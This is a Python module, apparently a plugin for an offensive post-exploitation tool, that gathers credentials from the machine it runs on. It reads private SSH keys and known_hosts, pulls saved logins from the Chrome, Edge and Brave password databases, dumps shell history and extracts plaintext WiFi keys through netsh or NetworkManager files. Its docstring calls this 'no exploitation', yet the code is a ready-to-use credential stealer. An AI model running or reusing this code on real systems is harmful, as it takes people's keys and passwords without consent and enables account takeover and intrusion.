"""Credential harvesting — collect credentials from common OS locations.
No exploitation — reads files the current user has access to."""

import os
import sys
import json
import sqlite3
import shutil
import tempfile
from typing import Optional


def run(args: list[str]) -> str:
    """Module entry point.

    Usage:
        credharvest all    — collect everything we can
        credharvest ssh    — SSH keys
        credharvest chrome — Chrome passwords (Linux/macOS)
        credharvest history — shell/browser history
        credharvest wifi   — saved WiFi credentials
    """
    if not args:
        return "Usage: credharvest all|ssh|chrome|history|wifi"

    method = args[0].lower()
    dispatch = {
        "all": harvest_all,
        "ssh": harvest_ssh_keys,
        "chrome": harvest_chrome,
        "history": harvest_history,
        "wifi": harvest_wifi,
    }

    func = dispatch.get(method)
    if func is None:
        return f"Unknown method: {method}"

    return func()


def harvest_all() -> str:
    results = []
    for name, func in [
        ("SSH Keys", harvest_ssh_keys),
        ("Chrome/Chromium", harvest_chrome),
        ("Shell History", harvest_history),
        ("WiFi Credentials", harvest_wifi),
    ]:
        try:
            output = func()
            results.append(f"=== {name} ===\n{output}")
        except Exception as e:
            results.append(f"=== {name} === ERROR: {e}")
    return "\n\n".join(results)


def harvest_ssh_keys() -> str:
    home = os.path.expanduser("~")
    ssh_dir = os.path.join(home, ".ssh")
    if not os.path.isdir(ssh_dir):
        return f"No SSH directory at {ssh_dir}"

    found = []
    key_files = [
        "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
        "id_rsa.pub", "id_ed25519.pub",
    ]
    for kf in key_files:
        key_path = os.path.join(ssh_dir, kf)
        if os.path.isfile(key_path):
            try:
                with open(key_path) as f:
                    found.append(f"--- {kf} ---\n{f.read().strip()}")
            except (PermissionError, OSError):
                found.append(f"--- {kf} --- [permission denied]")

    known_hosts = os.path.join(ssh_dir, "known_hosts")
    if os.path.isfile(known_hosts):
        try:
            with open(known_hosts) as f:
                hosts = f.read().strip()
                found.append(f"--- known_hosts ---\n{hosts}")
        except (PermissionError, OSError):
            pass

    return "\n\n".join(found) if found else "No SSH keys found"


def harvest_chrome() -> str:
    """Collect Chrome/Chromium Login Data (encrypted SQLite)."""
    if sys.platform == "linux":
        candidates = [
            os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            os.path.expanduser("~/.config/chromium/Default/Login Data"),
            os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/Login Data"),
        ]
    elif sys.platform == "darwin":
        candidates = [
            os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"),
        ]
    elif sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA", "")
        candidates = [
            os.path.join(local, "Google/Chrome/User Data/Default/Login Data"),
            os.path.join(local, "Microsoft/Edge/User Data/Default/Login Data"),
        ]
    else:
        return "Unsupported platform for Chrome harvesting"

    for path in candidates:
        if os.path.isfile(path):
            try:
                copy_path = os.path.join(tempfile.gettempdir(), "LoginData_copy")
                shutil.copy2(path, copy_path)

                conn = sqlite3.connect(copy_path)
                cursor = conn.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                )
                rows = cursor.fetchall()
                conn.close()
                os.unlink(copy_path)

                lines = [f"Chrome DB: {path} ({len(rows)} entries)"]
                for url, username, password_value in rows:
                    lines.append(f"  {url} | {username} | [encrypted] {len(password_value)} bytes")
                return "\n".join(lines)
            except Exception as e:
                return f"Chrome harvest failed ({path}): {e}"

    return "No Chrome/Chromium Login Data found"


def harvest_history() -> str:
    """Collect shell command history."""
    found = []
    home = os.path.expanduser("~")

    for hist_file in [".bash_history", ".zsh_history", ".fish_history", ".sh_history"]:
        path = os.path.join(home, hist_file)
        if os.path.isfile(path):
            try:
                with open(path) as f:
                    content = f.read().strip()
                    lines = content.splitlines()
                    found.append(f"--- {hist_file} ({len(lines)} entries) ---\n{content[:5000]}")
            except (PermissionError, OSError):
                found.append(f"--- {hist_file} --- [permission denied]")

    return "\n\n".join(found) if found else "No shell history found"


def harvest_wifi() -> str:
    """Collect saved WiFi credentials."""
    if sys.platform == "win32":
        import subprocess
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            return f"WiFi enumeration failed: {result.stderr}"

        profiles = []
        for line in result.stdout.splitlines():
            if "All User Profile" in line:
                profile_name = line.split(":")[-1].strip()
                key_result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={profile_name}", "key=clear"],
                    capture_output=True, text=True
                )
                key_line = "N/A"
                for kline in key_result.stdout.splitlines():
                    if "Key Content" in kline:
                        key_line = kline.split(":")[-1].strip()
                        break
                profiles.append(f"  {profile_name}: {key_line}")

        return f"WiFi Profiles ({len(profiles)}):\n" + "\n".join(profiles) if profiles else "No WiFi profiles"

    elif sys.platform == "linux":
        conn_dir = "/etc/NetworkManager/system-connections"
        if not os.path.isdir(conn_dir):
            conn_dir = os.path.expanduser("~/.config/NetworkManager/connections")

        if not os.path.isdir(conn_dir):
            return "No NetworkManager connections directory found"

        found = []
        for entry in os.listdir(conn_dir):
            filepath = os.path.join(conn_dir, entry)
            try:
                with open(filepath) as f:
                    content = f.read()
                found.append(f"--- {entry} ---\n{content}")
            except (PermissionError, OSError):
                found.append(f"--- {entry} --- [permission denied]")

        return "\n\n".join(found) if found else "No WiFi configs found"

    return "WiFi harvesting not supported on this platform"
